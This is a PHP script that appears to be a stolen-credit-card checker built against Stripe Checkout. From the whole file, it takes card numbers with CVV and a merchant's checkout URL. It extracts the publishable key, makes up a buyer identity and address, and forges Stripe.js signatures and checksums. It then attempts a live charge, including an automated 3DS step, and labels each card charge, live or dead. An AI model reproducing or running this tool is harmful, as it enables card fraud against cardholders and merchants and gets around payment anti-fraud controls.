<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');

$card = $_GET['card'] ?? $_POST['card'] ?? '';
$checkout_url = $_GET['url'] ?? $_POST['url'] ?? '';

if (empty($card) || empty($checkout_url)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'msg' => 'Missing parameters: card (cc|mm|yy|cvv), url']);
    exit;
}

$card_parts = explode('|', $card);
if (count($card_parts) < 4) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'msg' => 'Invalid card format. Use: cc|mm|yy|cvv']);
    exit;
}

$cc = trim($card_parts[0]);
$mm = str_pad(trim($card_parts[1]), 2, '0', STR_PAD_LEFT);
$yy = trim($card_parts[2]);
$cvv = trim($card_parts[3]);

if (strlen($yy) == 2) {
    $yy = '20' . $yy;
}

preg_match('/cs_(live|test)_[A-Za-z0-9]+/', $checkout_url, $cs_match);
if (!$cs_match) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'msg' => 'Could not extract CS from URL']);
    exit;
}
$cs_live = $cs_match[0];

if (!strpos($checkout_url, '#')) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'msg' => 'URL missing hash part']);
    exit;
}

$hash_part = explode('#', $checkout_url)[1];
$hash_part = urldecode($hash_part);
if (strpos($hash_part, '%%%')) {
    $hash_part = explode('%%%', $hash_part)[0];
}

try {
    $decoded = base64_decode($hash_part);
    if ($decoded === false) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'msg' => 'Failed to decode hash']);
        exit;
    }
    
    $xor_decoded = '';
    for ($i = 0; $i < strlen($decoded); $i++) {
        $xor_decoded .= chr(ord($decoded[$i]) ^ 5);
    }
    $data = json_decode($xor_decoded, true);
    $pk_live = $data['publishableKey'] ?? $data['apiKey'] ?? null;
    
    if (!$pk_live) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'msg' => 'Could not extract PK from URL']);
        exit;
    }
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'msg' => 'Failed to decode URL', 'exception' => $e->getMessage()]);
    exit;
}

function random_hex($length) {
    return bin2hex(random_bytes($length / 2));
}

function random_stripe_tag() {
    $tag = random_hex(10);
    return "stripe.js/{$tag}; stripe-js-v3/{$tag}; checkout";
}

function xor_encode($plaintext) {
    $ciphertext = '';
    for ($i = 0; $i < strlen($plaintext); $i++) {$ciphertext .= chr(ord($plaintext[$i]) ^ 5);}
    return $ciphertext;
}

function get_js_encoded_string($pm) {
    $pm_encoded = xor_encode($pm);
    $base64_encoded = base64_encode($pm_encoded);
    $encoded_text = str_replace(['/', '+'], ['%2F', '%2B'], $base64_encoded);
    return $encoded_text . "eCUl";
}

$fname = ['John', 'Jane', 'Alex', 'Chris'][rand(0, 3)];
$lname = ['Smith', 'Doe', 'Brown', 'Miller'][rand(0, 3)];
$email = strtolower($fname . '.' . $lname . rand(1000, 9999) . '@gmail.com');

$addresses = [
    ['street' => '3501 S Main St', 'city' => 'Gainesville', 'state' => 'FL', 'zip' => '32601'],
    ['street' => '311 Otter Way', 'city' => 'Frederica', 'state' => 'DE', 'zip' => '19946'],
    ['street' => '5035 93rd Ave', 'city' => 'Pinellas Park', 'state' => 'FL', 'zip' => '33782'],
];
$addr = $addresses[rand(0, 2)];

$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36";
$stripe_tag = random_stripe_tag();
$pm_suffix = random_hex(4);
$version = random_hex(10);

$headers = [
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'user-agent: ' . $ua,
    'origin: https://checkout.stripe.com',
    'referer: https://checkout.stripe.com/',
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cs_live.'/init');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pk_live.'&eid=NA&browser_locale=en-US&redirect_type=url');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
curl_close($ch);

$json = json_decode($response, true);
if (!$json || isset($json['error'])) {
    $msg = $json['error']['message'] ?? 'Init failed';
    echo json_encode(['status' => 'dead', 'msg' => $msg, 'merchant' => 'Unknown', 'price' => 'USD 0', 'product' => 'Unknown']);
    exit;
}

$init_checksum = $json['init_checksum'];
$merchant = $json['account_settings']['display_name'] ?? 'Unknown';
$currency = $json['currency'] ?? 'usd';

$items = 'Unknown';
if (isset($json['invoice']['lines']['data'][0]['price']['product']['name'])) {
    $items = $json['invoice']['lines']['data'][0]['price']['product']['name'];
} elseif (isset($json['line_item_group']['line_items'][0]['name'])) {
    $items = $json['line_item_group']['line_items'][0]['name'];
}

$amount = 0;
if (isset($json['line_item_group']['line_items'][0]['total'])) {
    $amount = $json['line_item_group']['line_items'][0]['total'];
} elseif (isset($json['invoice']['total'])) {
    $amount = $json['invoice']['total'];
} elseif (isset($json['line_item_group']['total'])) {
    $amount = $json['line_item_group']['total'];
}
$price_str = strtoupper($currency) . ' ' . ($amount/100);

$pm_data = [
    'type' => 'card',
    'card[number]' => $cc,
    'card[cvc]' => $cvv,
    'card[exp_month]' => $mm,
    'card[exp_year]' => $yy,
    'billing_details[name]' => $fname . ' ' . $lname,
    'billing_details[email]' => $email,
    'billing_details[address][country]' => 'US',
    'billing_details[address][line1]' => $addr['street'],
    'billing_details[address][city]' => $addr['city'],
    'billing_details[address][postal_code]' => $addr['zip'],
    'billing_details[address][state]' => $addr['state'],
    'key' => $pk_live,
    'payment_user_agent' => $stripe_tag
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($pm_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
curl_close($ch);

$json = json_decode($response, true);
if (!$json || !isset($json['id'])) {
    $msg = $json['error']['message'] ?? 'PM creation failed';
    $decline_code = $json['error']['decline_code'] ?? $json['error']['code'] ?? null;
    if ($decline_code) {
        $msg = strtoupper($decline_code) . ' » ' . $msg;
    }
    echo json_encode(['status' => 'dead', 'msg' => $msg, 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
    exit;
}

$newpm = $json['id'];
$pm_str = '{"id":"' . $newpm . $pm_suffix . '"';
$newpm_enc = get_js_encoded_string($pm_str);

$confirm_data = [
    'eid' => 'NA',
    'payment_method' => $newpm,
    'consent[terms_of_service]' => 'accepted',
    'expected_amount' => $amount,
    'expected_payment_method_type' => 'card',
    'key' => $pk_live,
    'version' => $version,
    'init_checksum' => $init_checksum,
    'js_checksum' => $newpm_enc
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cs_live.'/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($confirm_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
curl_close($ch);

$json = json_decode($response, true);
$status = $json['status'] ?? null;

if ($status == 'succeeded') {
    echo json_encode(['status' => 'charge', 'msg' => 'Payment Successful', 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
    exit;
}

if (strpos($response, 'insufficient_funds')) {
    echo json_encode(['status' => 'live', 'msg' => 'Insufficient Funds', 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
    exit;
}

if (isset($json['error'])) {
    $msg = $json['error']['message'] ?? 'Confirm failed';
    $decline_code = $json['error']['decline_code'] ?? $json['error']['code'] ?? null;
    if ($decline_code) {
        $msg = strtoupper($decline_code) . ' » ' . $msg;
    }
    echo json_encode(['status' => 'dead', 'msg' => $msg, 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
    exit;
}

$payatt = $json['payment_intent']['next_action']['use_stripe_sdk']['three_d_secure_2_source'] ?? null;
$servertrans = $json['payment_intent']['next_action']['use_stripe_sdk']['server_transaction_id'] ?? null;
$pi = $json['payment_intent']['id'] ?? null;
$secret = $json['payment_intent']['client_secret'] ?? null;

if (!$payatt || !$servertrans) {
    $msg = $json['payment_intent']['last_payment_error']['message'] ?? 'Payment failed';
    $decline_code = $json['payment_intent']['last_payment_error']['decline_code'] ?? $json['payment_intent']['last_payment_error']['code'] ?? null;
    if ($decline_code) {
        $msg = strtoupper($decline_code) . ' » ' . $msg;
    }
    echo json_encode(['status' => 'dead', 'msg' => $msg, 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
    exit;
}

$result_json = json_encode(['threeDSServerTransID' => $servertrans]);
$enc_server = base64_encode($result_json);

$auth_data = [
    'source' => $payatt,
    'browser' => json_encode([
        'fingerprintAttempted' => true,
        'fingerprintData' => $enc_server,
        'challengeWindowSize' => null,
        'threeDSCompInd' => 'Y',
        'browserJavaEnabled' => false,
        'browserJavascriptEnabled' => true,
        'browserLanguage' => '',
        'browserColorDepth' => '24',
        'browserScreenHeight' => '1080',
        'browserScreenWidth' => '1920',
        'browserTZ' => '-300',
        'browserUserAgent' => $ua
    ]),
    'one_click_authn_device_support[hosted]' => 'false',
    'one_click_authn_device_support[same_origin_frame]' => 'false',
    'one_click_authn_device_support[spc_eligible]' => 'true',
    'one_click_authn_device_support[webauthn_eligible]' => 'true',
    'one_click_authn_device_support[publickey_credentials_get_allowed]' => 'true',
    'key' => $pk_live
];

$headers_3ds = [
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'referer: https://js.stripe.com/',
    'user-agent: ' . $ua,
    'origin: https://js.stripe.com',
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($auth_data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_3ds);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
curl_close($ch);

$json = json_decode($response, true);
if ($json && isset($json['state']) && $json['state'] === 'challenge_required') {
    echo json_encode(['status' => 'dead', 'msg' => '[ 3DS BIN ] » [challenge_required]', 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_intents/$pi?key=$pk_live&is_stripe_sdk=false&client_secret=$secret");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_3ds);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$result = curl_exec($ch);
curl_close($ch);

$extract = json_decode($result, true);
$status = $extract['status'] ?? null;

if ($status == 'succeeded') {
    echo json_encode(['status' => 'charge', 'msg' => 'Payment Successful', 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
    exit;
}

if (strpos($result, 'insufficient_funds')) {
    $msg = $extract['last_payment_error']['message'] ?? 'Insufficient Funds';
    $decline_code = $extract['last_payment_error']['decline_code'] ?? null;
    if ($decline_code) {
        $msg = strtoupper($decline_code) . ': ' . $msg;
    }
    echo json_encode(['status' => 'live', 'msg' => $msg, 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
    exit;
}

$msg = $extract['last_payment_error']['message'] ?? $extract['error']['message'] ?? 'Payment Failed';
$decline_code = $extract['last_payment_error']['decline_code'] ?? $extract['error']['decline_code'] ?? null;
$code = $extract['last_payment_error']['code'] ?? $extract['error']['code'] ?? null;

if ($decline_code || $code) {
    $msg = ($decline_code ? strtoupper($decline_code) : '') . ($code ? ' : ' . strtoupper($code) : '') . ' » ' . $msg;
}
echo json_encode(['status' => 'dead', 'msg' => $msg, 'merchant' => $merchant, 'price' => $price_str, 'product' => $items]);
?>
